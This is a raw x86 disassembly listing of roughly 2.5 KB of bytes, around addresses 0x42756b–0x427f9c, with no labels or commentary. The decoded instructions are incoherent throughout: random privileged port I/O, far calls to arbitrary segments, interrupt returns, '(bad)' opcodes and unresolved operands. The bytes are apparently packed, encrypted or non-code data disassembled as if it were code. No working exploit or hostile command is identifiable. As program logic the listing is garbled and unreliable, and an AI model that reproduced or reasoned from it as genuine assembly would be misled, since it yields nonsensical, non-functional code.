  42756b:	lds    ecx,FWORD PTR [edx-0x5d]
  42756e:	jb     0x42753e
  427570:	pop    ecx
  427571:	push   eax
  427572:	mov    edx,0xdbc53d2
  427577:	dec    eax
  427578:	call   DWORD PTR [ecx+ecx*2-0x58]
  42757c:	pushf  
  42757d:	cmc    
  42757e:	call   0x3c39:0x3da3ef4b
  427585:	xor    DWORD PTR [edx-0x17c5e69c],esi
  42758b:	imul   eax,DWORD PTR [esi+0x17],0x80b61a84
  427592:	outs   dx,DWORD PTR ds:[esi]
  427593:	cdq    
  427594:	sbb    al,0xb9
  427596:	jl     0x427574
  427598:	iret   
  427599:	clc    
  42759a:	das    
  42759b:	xchg   ebp,eax
  42759c:	scas   al,BYTE PTR es:[edi]
  42759d:	adc    BYTE PTR [esi+0x71],ah
  4275a0:	mov    bl,0x1c
  4275a2:	or     dl,BYTE PTR [ebx+0x899521f]
  4275a8:	or     dh,ch
  4275aa:	push   ecx
  4275ab:	ins    BYTE PTR es:[edi],dx
  4275ac:	mov    al,0xbf
  4275ae:	push   cs
  4275af:	icebp  
  4275b0:	sbb    DWORD PTR ds:0x37eb6496,esi
  4275b6:	addr16 mov edx,0x546ebc9c
  4275bc:	cmp    al,BYTE PTR [ebp-0x2a]
  4275bf:	je     0x42755d
  4275c1:	mov    ebx,0x1a23a078
  4275c6:	ins    DWORD PTR es:[edi],dx
  4275c7:	or     al,0x24
  4275c9:	jns    0x4275c6
  4275cb:	or     BYTE PTR [edx+0x25],al
  4275ce:	and    esi,DWORD PTR [ecx+0x12]
  4275d1:	dec    ebp
  4275d2:	or     dh,ch
  4275d4:	push   eax
  4275d5:	outs   dx,BYTE PTR es:[esi]
  4275d7:	inc    ecx
  4275d8:	nop
  4275d9:	add    eax,DWORD PTR [edx-0x5e]
  4275dc:	xor    BYTE PTR [eax],bh
  4275de:	lahf   
  4275df:	xor    al,0x8a
  4275e1:	clc    
  4275e2:	aaa    
  4275e3:	or     al,0xb3
  4275e5:	fcomp  DWORD PTR [edx+edi*8+0x6b]
  4275e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275ea:	mov    dl,0xb5
  4275ec:	out    dx,al
  4275ed:	int3   
  4275ee:	pop    ss
  4275ef:	neg    BYTE PTR es:[ecx]
  4275f2:	ds pop eax
  4275f4:	cld    
  4275f5:	fs pop edx
  4275f7:	jmp    0x4275f9
  4275f9:	in     al,dx
  4275fa:	cld    
  4275fb:	gs inc eax
  4275fd:	mov    ah,0xb1
  4275ff:	sbb    esp,DWORD PTR [ebp-0x17]
  427602:	xor    bh,BYTE PTR [ebx+0x539bdb6a]
  427608:	into   
  427609:	fidiv  DWORD PTR [edx+0x41]
  42760c:	adc    BYTE PTR [edi-0x59155e59],0x93
  427613:	pushf  
  427614:	push   ebx
  427615:	loopne 0x4275b8
  427617:	mov    esi,0x34d596ed
  42761c:	cmp    esp,ebp
  42761e:	adc    esi,DWORD PTR [edx+0x3a998e9]
  427624:	jmp    0x4275aa
  427626:	push   esi
  427627:	cs retf 
  427629:	popa   
  42762a:	ss jmp 0x24b26276
  427630:	jmp    0x427655
  427632:	push   ss
  427633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427634:	dec    esp
	...
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x115c57c6
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [esi+edx*2-0x24],al
  4276b1:	adc    ecx,esp
  4276b3:	arpl   WORD PTR [esi-0x23],si
  4276b6:	push   ebp
  4276b7:	repz mov ebx,0xde457c0d
  4276bd:	sub    al,0x18
  4276bf:	jo     0x427704
  4276c1:	cmp    BYTE PTR [edx+0x6b],0x0
  4276c5:	fistp  DWORD PTR [edi]
  4276c7:	inc    edi
  4276c8:	sbb    BYTE PTR [ebp-0xf],dh
  4276cb:	add    bh,BYTE PTR [edx+edx*4-0x16]
  4276cf:	mov    dh,0x61
  4276d1:	icebp  
  4276d2:	xchg   ebp,eax
  4276d3:	and    BYTE PTR [esi+0x72],ah
  4276d6:	aam    0x2d
  4276d8:	ds shr ebx,0xb7
  4276dc:	out    0x11,eax
  4276de:	aam    0x2
  4276e0:	sbb    eax,0x4f09f164
  4276e5:	jno    0x42771b
  4276e7:	jl     0x42773f
  4276e9:	fstp   TBYTE PTR [ecx+0x3b71d1ef]
  4276ef:	dec    eax
  4276f0:	sar    BYTE PTR [esi],1
  4276f2:	sahf   
  4276f3:	inc    eax
  4276f4:	pop    ebp
  4276f5:	sar    DWORD PTR [edi-0x6b],cl
  4276f8:	add    DWORD PTR ds:0xc9ce58bd,ebp
  4276fe:	xor    al,0x4e
  427700:	jle    0x4276f9
  427702:	fdivr  QWORD PTR [ecx]
  427704:	sbb    ecx,eax
  427706:	imul   ebx,DWORD PTR [edi-0x3ccaf099],0x9f8bd076
  427710:	aaa    
  427711:	mov    al,ds:0xc34c4c05
  427716:	call   0xd96e:0xbcc20714
  42771d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42771e:	cmp    eax,0xb84bbed8
  427723:	pop    ss
  427724:	out    0xc8,eax
  427726:	pop    ebp
  427727:	aas    
  427728:	dec    ebp
  427729:	popa   
  42772a:	push   es
  42772b:	fsub   DWORD PTR [eax+0x1333a8fa]
  427731:	jg     0x427714
  427733:	enclu  
  427736:	mov    al,0xd
  427738:	outs   dx,DWORD PTR ds:[esi]
  427739:	add    bl,dl
  42773b:	repz sahf 
  42773d:	sbb    BYTE PTR [edi+0x47],0x20
  427741:	and    ah,dl
  427743:	pusha  
  427744:	mov    BYTE PTR [ebx-0x22211230],cl
  42774a:	mov    dl,dl
  42774c:	lahf   
  42774d:	mov    ah,0x2
  42774f:	popf   
  427750:	loop   0x4276f3
  427752:	shl    DWORD PTR [ecx+0x10],cl
  427755:	cld    
  427756:	add    BYTE PTR [esi],dl
  427758:	cmp    BYTE PTR [ecx+0xb145af0],al
  42775e:	push   esi
  42775f:	cld    
  427760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427761:	lds    esp,FWORD PTR [esi+0x6c]
  427764:	mov    ecx,0x5e4847b2
  427769:	je     0x4276fc
  42776b:	push   eax
  42776c:	sbb    esi,esi
  42776e:	or     al,0x16
  427770:	cwde   
  427771:	push   ss
  427772:	call   0x24fa:0xb75d11e4
  427779:	adc    eax,0x8e61f508
  42777e:	inc    esi
  42777f:	outs   dx,DWORD PTR ds:[esi]
  427780:	dec    edx
  427781:	ins    BYTE PTR es:[edi],dx
  427782:	or     eax,0x4a0215fc
  427787:	pop    esi
  427788:	test   al,0x1b
  42778a:	not    DWORD PTR [edi-0x12]
  42778d:	int3   
  42778e:	push   eax
  42778f:	xlat   BYTE PTR ds:[ebx]
  427790:	loopne 0x427805
  427792:	mov    DWORD PTR [edx-0x73],ebp
  427795:	push   ebp
  427796:	jno    0x42778b
  427798:	xor    al,0x97
  42779a:	mov    ebp,0xe41da785
  42779f:	cli    
  4277a0:	add    DWORD PTR [eax+0x39],eax
  4277a3:	lahf   
  4277a4:	ret    0x2e97
  4277a7:	xchg   edi,eax
  4277a8:	sub    esp,DWORD PTR [eax+0x4d491f68]
  4277ae:	in     eax,dx
  4277af:	(bad)  
  4277b0:	mov    edx,0xd074a61e
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	lock xchg DWORD PTR [ebp+0x1a5a4cf],ecx
  427829:	add    BYTE PTR [edi],al
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR ds:0x18a5279f,bh
  427833:	push   eax
  427834:	adc    DWORD PTR [ecx+0x50],0x66a2430f
  42783b:	mov    edx,0x6fc47a0e
  427840:	lds    di,DWORD PTR [esi]
  427843:	cli    
  427844:	jg     0x427803
  427846:	fsubr  QWORD PTR [eax-0x2b6a8d99]
  42784c:	jl     0x4277d4
  42784e:	iret   
  42784f:	out    0x50,al
  427851:	dec    ebp
  427852:	out    dx,al
  427853:	cmp    BYTE PTR [ebp+0x3b],dl
  427856:	das    
  427857:	push   0xffffffa3
  427859:	cmp    eax,0xa4ec83af
  42785e:	adc    DWORD PTR [edx-0x52ea9855],esi
  427864:	push   ecx
  427865:	sti    
  427866:	and    ah,al
  427868:	cwde   
  427869:	push   esi
  42786a:	and    eax,0x6e485846
  42786f:	mov    eax,ds:0xb1d438f2
  427874:	(bad)  
  427875:	xchg   ebx,eax
  427876:	stos   BYTE PTR es:[edi],al
  427877:	int    0xf5
  427879:	scas   al,BYTE PTR es:[edi]
  42787a:	mov    ebx,0x93570908
  42787f:	and    DWORD PTR ds:0x5506757d,0x30
  427886:	dec    ebp
  427887:	rcl    BYTE PTR [edi],0xd7
  42788a:	add    DWORD PTR [edi-0xa],edx
  42788d:	push   ebp
  42788e:	mov    ebx,0xf6a132d4
  427893:	aam    0xa4
  427895:	sub    BYTE PTR [edx+0x70e0f0d4],0xce
  42789c:	imul   ecx,DWORD PTR [eax-0x13],0xf0618ec4
  4278a3:	pop    edx
  4278a4:	into   
  4278a5:	retf   
  4278a6:	bound  ecx,QWORD PTR [eax+eax*2]
  4278a9:	or     edx,esi
  4278ab:	or     edx,DWORD PTR [ebp-0x36d0ffdb]
  4278b1:	mov    ecx,0xd23ccc20
  4278b6:	dec    eax
  4278b7:	retf   0xc77a
  4278ba:	loopne 0x427930
  4278bc:	out    dx,eax
  4278bd:	add    DWORD PTR [edx],ebp
  4278bf:	les    edi,FWORD PTR [ebx]
  4278c1:	(bad)  
  4278c2:	mov    ah,0x2f
  4278c4:	and    ch,ah
  4278c6:	add    cl,BYTE PTR [edx]
  4278c8:	and    DWORD PTR [edi-0x2d],edx
  4278cb:	jmp    0x42790d
  4278cd:	test   DWORD PTR [edi-0x4b],0xbda3b37b
  4278d4:	or     BYTE PTR [edi+0x4d7c11b1],bh
  4278da:	jecxz  0x4278a7
  4278dc:	mov    dl,0xe9
  4278de:	xor    bh,BYTE PTR [edx-0x7e]
  4278e1:	adc    dl,BYTE PTR [ebp+eiz*8-0x63df2c20]
  4278e8:	mov    esp,0x653b4f88
  4278ed:	sub    ch,ch
  4278ef:	enter  0x68a7,0xc2
  4278f3:	cmp    edx,DWORD PTR [edx-0x6c39e816]
  4278f9:	loopne 0x42790e
  4278fb:	jge    0x427902
  4278fd:	fcomp  DWORD PTR [eax+0x6b]
  427900:	mov    bl,0xc6
  427902:	xchg   ebp,eax
  427903:	push   edx
  427904:	jecxz  0x4278f5
  427906:	adc    eax,0x538f2958
  42790b:	cwde   
  42790c:	xor    DWORD PTR [esi],esi
  42790e:	lods   al,BYTE PTR ds:[esi]
  42790f:	repnz or BYTE PTR gs:[edx+0x1a8f8f4a],bh
  427917:	pop    esi
  427918:	ja     0x4278a5
  42791a:	pushf  
  42791b:	sar    BYTE PTR [edi+0x56],0x13
  42791f:	cs cs sbb al,0xba
  427923:	ret    0x8d60
  427926:	jmp    0x49fe60a6
  42792b:	(bad)  
  42792c:	xchg   esp,eax
  42792d:	or     ebx,ecx
  42792f:	fstp   st(6)
  427931:	out    0xe,eax
  427933:	mov    ecx,0x31
	...
  427994:	add    BYTE PTR [eax],al
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0xccec95d0
  4279a5:	cdq    
  4279a6:	stos   DWORD PTR es:[edi],eax
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [ebx],dh
  4279af:	in     al,0x9
  4279b1:	out    dx,al
  4279b2:	push   eax
  4279b3:	or     BYTE PTR [ebp-0x19],0x4d
  4279b7:	pop    esi
  4279b8:	mov    dl,0x6e
  4279ba:	addr16 xchg edi,eax
  4279bc:	sub    al,0xe8
  4279be:	pop    ds
  4279bf:	repnz test edi,edi
  4279c2:	dec    ecx
  4279c3:	jbe    0x4279b9
  4279c5:	rcr    dl,cl
  4279c7:	outs   dx,DWORD PTR ds:[esi]
  4279c8:	pop    es
  4279c9:	adc    DWORD PTR [ecx+0x74],esp
  4279cc:	nop
  4279cd:	std    
  4279ce:	cmp    DWORD PTR [esi+0x39da4818],esp
  4279d4:	mov    edx,0xefa83381
  4279d9:	or     eax,0xf0f5eeb5
  4279de:	dec    esp
  4279df:	std    
  4279e0:	aam    0x9c
  4279e2:	(bad)  
  4279e3:	(bad)  
  4279e4:	mov    bl,0x15
  4279e6:	adc    BYTE PTR [ebx],0xf3
  4279e9:	inc    ebx
  4279ea:	(bad)
  4279ed:	xor    eax,0x988da3b6
  4279f2:	hlt    
  4279f3:	fdiv   QWORD PTR [edx]
  4279f5:	call   0x8fd6:0x29d73e1d
  4279fc:	sub    al,0xa0
  4279fe:	cmp    eax,esi
  427a00:	and    al,0xd5
  427a02:	(bad)  
  427a03:	jp     0x4279af
  427a05:	mov    bl,0xb0
  427a07:	lock mov ecx,0x8ec8f125
  427a0d:	gs mov bl,0x93
  427a10:	inc    ebp
  427a11:	out    0x1f,eax
  427a13:	mov    eax,0x9f773d3b
  427a18:	shl    BYTE PTR [ebx-0x3bea6da5],0xbb
  427a1f:	ds ins DWORD PTR es:[edi],dx
  427a21:	pop    ecx
  427a22:	push   esp
  427a23:	jle    0x427a86
  427a25:	loop   0x427a2d
  427a27:	push   ss
  427a28:	es stc 
  427a2a:	fwait
  427a2b:	add    eax,0xf73859e7
  427a30:	loope  0x427aa8
  427a32:	push   ds
  427a33:	add    eax,0x50131911
  427a38:	mov    eax,0x8ca92a2f
  427a3d:	mov    esp,esi
  427a3f:	pushf  
  427a40:	xchg   BYTE PTR [eax+ecx*8-0x4e],cl
  427a44:	pop    ebp
  427a45:	ja     0x427a66
  427a47:	xor    ah,dh
  427a49:	sbb    ebp,DWORD PTR [ecx+0x5d66406e]
  427a4f:	pop    ss
  427a50:	dec    edi
  427a51:	sbb    edi,DWORD PTR [edx+0x3b432d33]
  427a57:	adc    bh,BYTE PTR [esi-0x48]
  427a5a:	mov    ch,0xa4
  427a5c:	pop    ss
  427a5d:	test   eax,0x5e2f7630
  427a62:	fistp  DWORD PTR [ecx+0x49]
  427a65:	sbb    esp,DWORD PTR [ecx-0x7f449978]
  427a6b:	jae    0x427ae0
  427a6d:	fadd   DWORD PTR [edx+0x6d]
  427a70:	out    dx,al
  427a71:	test   eax,0xfdd03fa5
  427a76:	mov    fs,WORD PTR [eax]
  427a78:	push   ebp
  427a79:	leave  
  427a7a:	inc    esi
  427a7b:	jmp    0xa97461f7
  427a80:	add    al,0x61
  427a82:	je     0x427a73
  427a84:	mov    eax,ds:0xd45bc591
  427a89:	push   edx
  427a8a:	cwde   
  427a8b:	dec    ebp
  427a8c:	fcom   DWORD PTR [eax+0x114739e9]
  427a92:	call   0x823c:0xc2e59d1b
  427a99:	push   cs
  427a9a:	mul    DWORD PTR [edi]
  427a9c:	push   edx
  427a9d:	mov    bh,0x8
  427a9f:	cmc    
  427aa0:	xor    DWORD PTR [ebx],esp
  427aa2:	dec    esp
  427aa3:	xor    BYTE PTR [ecx],dl
  427aa5:	fs pop esi
  427aa7:	cmp    esi,DWORD PTR [ecx+edi*1+0x3506237d]
  427aae:	sub    BYTE PTR [eax-0x74],ch
  427ab1:	out    0x95,eax
  427ab3:	rol    BYTE PTR gs:[eax],cl
	...
  427b16:	retf   0x528b
  427b19:	jnp    0x427b6e
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	xchg   ebx,eax
  427b23:	jle    0x427b01
  427b25:	add    al,0xb2
  427b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [edi],cl
  427b2f:	mov    dl,0xc3
  427b31:	inc    edi
  427b32:	or     ecx,edx
  427b34:	imul   esi,DWORD PTR [esi],0xffffff9a
  427b37:	inc    esp
  427b38:	data16 mov al,0x98
  427b3b:	out    0x5c,eax
  427b3d:	jo     0x427b97
  427b3f:	enter  0x23df,0x5
  427b43:	popf   
  427b44:	pop    edx
  427b45:	stos   DWORD PTR es:[edi],eax
  427b46:	ds xchg ebp,eax
  427b48:	sbb    eax,0x7ed0ab58
  427b4d:	inc    esp
  427b4e:	sbb    eax,0x10c978f4
  427b53:	xchg   esp,eax
  427b54:	call   0xcd2f1262
  427b59:	fcomip st,st(3)
  427b5b:	das    
  427b5c:	dec    esp
  427b5d:	leave  
  427b5e:	pop    edx
  427b5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b60:	cs rcl al,1
  427b63:	sub    edi,DWORD PTR [edi-0x3da07d00]
  427b69:	dec    edi
  427b6a:	adc    DWORD PTR [edx+0x51c2665],ebp
  427b70:	pop    ebp
  427b71:	pop    esi
  427b72:	push   0x18
  427b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b75:	pop    esp
  427b76:	push   ebp
  427b77:	ins    BYTE PTR es:[edi],dx
  427b78:	inc    ecx
  427b79:	enter  0xdc50,0x49
  427b7d:	std    
  427b7e:	or     ah,BYTE PTR [ecx]
  427b80:	test   DWORD PTR [edi],0x14cb78ec
  427b86:	retf   0xf683
  427b89:	mov    dh,BYTE PTR ds:0x3f80782a
  427b8f:	mov    ebx,0xea3a988e
  427b94:	dec    ebx
  427b95:	push   edi
  427b96:	outs   dx,BYTE PTR ds:[esi]
  427b97:	xchg   ecx,eax
  427b98:	mov    ecx,0x55cd408
  427b9d:	mov    cl,0xab
  427b9f:	sub    edx,DWORD PTR [ebx]
  427ba1:	adc    BYTE PTR [eax+0x2bcb1f8b],bl
  427ba7:	adc    al,0x94
  427ba9:	xchg   edi,eax
  427baa:	retf   0x30e8
  427bad:	sbb    eax,0x57c66b55
  427bb2:	das    
  427bb3:	out    0x51,al
  427bb5:	neg    BYTE PTR [edx+0x62]
  427bb8:	out    0xe9,eax
  427bba:	fsub   QWORD PTR [ebx-0x5e4d1c0d]
  427bc0:	pop    esp
  427bc1:	add    al,dl
  427bc3:	push   esp
  427bc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bc5:	push   ebx
  427bc6:	pop    ebx
  427bc7:	lahf   
  427bc8:	xchg   ebp,eax
  427bc9:	cmp    BYTE PTR [ecx+0x5cabd7a8],0xe0
  427bd0:	cmc    
  427bd1:	add    ebp,DWORD PTR [eax-0x3e0ba9db]
  427bd7:	iret   
  427bd8:	xchg   ebx,eax
  427bd9:	xchg   ebx,eax
  427bda:	(bad)  
  427bdc:	dec    ebx
  427bdd:	add    al,0x26
  427bdf:	inc    ecx
  427be0:	inc    edx
  427be1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427be2:	pop    ebx
  427be3:	and    eax,edx
  427be5:	int    0x5e
  427be7:	or     cl,bh
  427be9:	mov    eax,ds:0x7cccc11d
  427bee:	outs   dx,BYTE PTR ds:[esi]
  427bef:	pop    ss
  427bf0:	in     al,dx
  427bf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bf2:	adc    eax,DWORD PTR [esi-0x2cd7dcad]
  427bf8:	outs   dx,DWORD PTR ds:[esi]
  427bf9:	fwait
  427bfa:	out    dx,eax
  427bfb:	add    eax,0x177fa431
  427c00:	push   esp
  427c01:	shl    DWORD PTR [ebp+0x5],0x63
  427c05:	cdq    
  427c06:	pop    ebx
  427c07:	ins    BYTE PTR es:[edi],dx
  427c08:	jno    0x427bf8
  427c0a:	xor    eax,0x4193ac80
  427c0f:	dec    edx
  427c10:	pop    edi
  427c11:	lock and al,0xd
  427c14:	sub    dl,BYTE PTR [edi-0x49ee7e34]
  427c1a:	mov    ds:0xe1bb6cce,al
  427c1f:	jns    0x427bff
  427c21:	dec    eax
  427c22:	stc    
  427c23:	push   ds
  427c24:	neg    DWORD PTR ds:0x7804ea9
  427c2a:	mov    eax,ecx
  427c2c:	jns    0x427c0f
  427c2e:	jecxz  0x427c6c
  427c30:	inc    eax
  427c31:	pop    es
  427c32:	mov    dl,0x24
  427c34:	add    BYTE PTR [eax],0x0
	...
  427c93:	add    BYTE PTR [eax],al
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0xa2b24085
  427ca5:	mov    ebx,0x1a8b9
  427caa:	pop    es
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    dl,bh
  427caf:	mov    cs,WORD PTR [eax]
  427cb1:	mov    dl,0xba
  427cb3:	ds inc eax
  427cb5:	sar    DWORD PTR ds:0xc8419f3c,cl
  427cbb:	xor    ah,bl
  427cbd:	cdq    
  427cbe:	xor    dl,BYTE PTR [esi]
  427cc0:	aam    0x37
  427cc2:	push   esp
  427cc3:	xor    al,BYTE PTR [eax]
  427cc5:	xchg   ebx,eax
  427cc7:	or     BYTE PTR [edx+ebp*8],ah
  427cca:	out    0x4,al
  427ccc:	ins    DWORD PTR es:[edi],dx
  427ccd:	jecxz  0x427d3e
  427ccf:	mov    ecx,0x356c7a7c
  427cd4:	ins    DWORD PTR es:[edi],dx
  427cd5:	fld1   
  427cd7:	mov    ecx,0xc79842c4
  427cdc:	mov    ebp,0xf770be6b
  427ce1:	sbb    edi,DWORD PTR [ebx+0x4e9bce96]
  427ce7:	push   edx
  427ce8:	xor    ebx,esp
  427cea:	or     ch,bl
  427cec:	add    edx,0x18
  427cef:	lock pop ebx
  427cf1:	sbb    eax,0x57a7be34
  427cf6:	push   ebp
  427cf7:	sub    BYTE PTR [edx+0x71],bl
  427cfa:	popa   
  427cfb:	mov    ch,0xaf
  427cfd:	add    cl,cl
  427cff:	jle    0x427d14
  427d01:	dec    ebp
  427d02:	sbb    dh,ah
  427d04:	mov    ?,WORD PTR [esi+ebp*1]
  427d07:	bound  esi,QWORD PTR [esi]
  427d09:	test   al,0xee
  427d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d0c:	push   ebx
  427d0d:	pop    ds
  427d0e:	pop    es
  427d0f:	cmc    
  427d10:	xor    al,0x73
  427d12:	mov    edx,0x658f9357
  427d17:	and    BYTE PTR [eax+ebx*1+0x27],dh
  427d1b:	mov    ?,WORD PTR [ebp-0x1970fb33]
  427d21:	std    
  427d22:	add    al,0xb
  427d24:	adc    BYTE PTR ds:0x993a7eb8,0xb4
  427d2b:	cmp    DWORD PTR [eax-0x4de0a216],0x4966c617
  427d35:	push   es
  427d36:	mov    WORD PTR [ebx],ss
  427d38:	cmp    DWORD PTR ds:0xef754e67,ebp
  427d3e:	gs addr16 push 0x5cd069c9
  427d45:	jg     0x427cf4
  427d47:	cmp    esp,DWORD PTR [ecx-0x49]
  427d4a:	fwait
  427d4b:	mov    BYTE PTR [ebx],dh
  427d4d:	dec    edi
  427d4e:	sbb    ebp,DWORD PTR [edx-0x66b21e65]
  427d54:	jmp    0x6209:0x80c3eaeb
  427d5b:	mov    WORD PTR [ebx],?
  427d5d:	mov    DWORD PTR [ecx+0x41],0xf37b39e0
  427d64:	jl     0x427dbc
  427d66:	pop    ss
  427d67:	mov    ah,0xe1
  427d69:	cmp    esi,esp
  427d6b:	inc    ebp
  427d6c:	ret    
  427d6d:	add    al,0x30
  427d6f:	stos   DWORD PTR es:[edi],eax
  427d70:	sub    eax,0x3b037f27
  427d75:	adc    DWORD PTR [esi+0x69c7e05a],ebx
  427d7b:	lds    eax,FWORD PTR [ebx+0x6f4ec645]
  427d81:	daa    
  427d82:	dec    ecx
  427d83:	and    al,BYTE PTR [edi+0x40]
  427d86:	cmp    DWORD PTR [edx],ebp
  427d88:	sbb    al,0x4c
  427d8a:	ror    DWORD PTR es:[ecx-0x142dfc91],0x83
  427d92:	js     0x427d89
  427d94:	icebp  
  427d95:	lds    ebx,FWORD PTR [ebx]
  427d97:	mov    al,ds:0x4db49de2
  427d9c:	in     eax,dx
  427d9d:	ja     0x427e08
  427d9f:	int3   
  427da0:	jns    0x427e14
  427da2:	mov    ch,0x4b
  427da4:	out    0xe5,al
  427da6:	lock pop edx
  427da8:	stos   DWORD PTR es:[edi],eax
  427da9:	push   ebp
  427daa:	add    eax,0xecd0e5e0
  427daf:	push   esp
  427db0:	jle    0x427d3b
  427db2:	fdivr  st,st(1)
  427db4:	add    BYTE PTR fs:[eax],al
	...
  427e13:	add    BYTE PTR [eax],al
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    dl,bh
  427e23:	shl    dh,0x5a
  427e26:	shr    BYTE PTR [ecx+0x1070001],0x0
  427e2d:	add    ch,ch
  427e2f:	iret   
  427e30:	mov    dl,0x48
  427e32:	shr    edi,0xcf
  427e35:	sub    ah,BYTE PTR [eax+0x2a]
  427e38:	sbb    bh,dh
  427e3a:	ds dec ebx
  427e3c:	sbb    BYTE PTR [eax+0x37b34a00],dh
  427e42:	aam    0xc2
  427e44:	push   0x34
  427e46:	out    dx,al
  427e47:	test   ch,0xcf
  427e4a:	les    ecx,FWORD PTR [esi]
  427e4c:	shr    DWORD PTR [esi+eiz*4-0x1d5df7aa],0x52
  427e54:	xor    ah,dh
  427e56:	or     ebx,DWORD PTR [eax]
  427e58:	mov    bl,0xea
  427e5a:	sub    eax,0xcfa5793c
  427e5f:	sti    
  427e60:	pop    es
  427e61:	jmp    0xa169:0x15d2aaac
  427e68:	push   ebx
  427e69:	adc    ch,BYTE PTR [ecx]
  427e6b:	ss push ebx
  427e6d:	test   DWORD PTR [ebp+0x1a],edx
  427e70:	mov    eax,ds:0x8cac4f89
  427e75:	cmp    DWORD PTR [eax+ebp*1-0x4],ebp
  427e79:	int    0x51
  427e7b:	xchg   edi,eax
  427e7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e7d:	and    edx,ebx
  427e7f:	dec    eax
  427e80:	stos   DWORD PTR es:[edi],eax
  427e81:	fld    TBYTE PTR [ebp+eiz*8-0x5a]
  427e85:	pop    esi
  427e86:	loop   0x427e90
  427e88:	mov    dl,0xbf
  427e8a:	add    BYTE PTR [edi+0x64],al
  427e8d:	cmp    ebp,ecx
  427e8f:	rol    DWORD PTR [ebx+0x76],0x40
  427e93:	pushf  
  427e94:	retf   0x5030
  427e97:	xor    ch,0x2d
  427e9a:	out    0x9b,eax
  427e9c:	sub    bh,bl
  427e9e:	jge    0x427e4d
  427ea0:	mov    WORD PTR [eax],ss
  427ea2:	fimul  WORD PTR ds:0x67e52dfb
  427ea8:	cld    
  427ea9:	inc    edx
  427eaa:	cmp    ecx,DWORD PTR [esi-0x48b5fd3a]
  427eb0:	xor    dh,bl
  427eb2:	sub    al,0xf6
  427eb4:	ins    BYTE PTR es:[edi],dx
  427eb5:	push   ds
  427eb6:	test   BYTE PTR [ebx],cl
  427eb8:	in     al,dx
  427eb9:	push   ebp
  427eba:	and    eax,DWORD PTR [esp+ecx*8+0x69204b1e]
  427ec1:	pop    eax
  427ec2:	jg     0x427e62
  427ec4:	enter  0x7f05,0x72
  427ec8:	aas    
  427ec9:	ds sti 
  427ecb:	das    
  427ecc:	cmp    ch,BYTE PTR [ebx]
  427ece:	add    DWORD PTR [esi+0x48],ecx
  427ed1:	inc    ebp
  427ed2:	lock rol ecx,1
  427ed5:	mov    bh,0x61
  427ed7:	rcl    BYTE PTR [esi+esi*4],1
  427eda:	aam    0x28
  427edc:	inc    edi
  427edd:	mov    esp,DWORD PTR ds:[ebx]
  427ee0:	ins    DWORD PTR es:[edi],dx
  427ee1:	jle    0x427e6d
  427ee3:	aas    
  427ee4:	loopne 0x427ed0
  427ee6:	push   edi
  427ee7:	dec    esi
  427ee8:	pop    ecx
  427ee9:	neg    BYTE PTR [ecx-0x75]
  427eec:	mov    bl,bh
  427eee:	mov    cl,0xe6
  427ef0:	into   
  427ef1:	gs cs xor al,0x63
  427ef5:	push   ebp
  427ef6:	dec    eax
  427ef7:	jmp    0x81239c83
  427efc:	adc    al,0xee
  427efe:	call   0xb4b565b
  427f03:	test   BYTE PTR [edx+0x8],ch
  427f06:	add    DWORD PTR ss:[ecx+ebx*4],esp
  427f0a:	xchg   edi,eax
  427f0c:	xchg   esi,eax
  427f0d:	fisttp QWORD PTR [ecx+0x6e380e87]
  427f13:	push   es
  427f14:	pop    eax
  427f15:	push   ds
  427f16:	mov    WORD PTR [ebx-0x32bb8b9f],?
  427f1c:	mov    esi,0xb0ce13fc
  427f21:	jge    0x427ecc
  427f23:	and    dl,BYTE PTR [esi+0x59]
  427f26:	jl     0x427f88
  427f28:	das    
  427f29:	fiadd  WORD PTR [esi-0x4b]
  427f2c:	xor    ebx,ebp
  427f2e:	dec    edi
  427f2f:	(bad)  
  427f30:	adc    eax,0x93ec6f32
	...
  427f95:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427f9b:	out    dx,eax
  427f9c:	cmc    
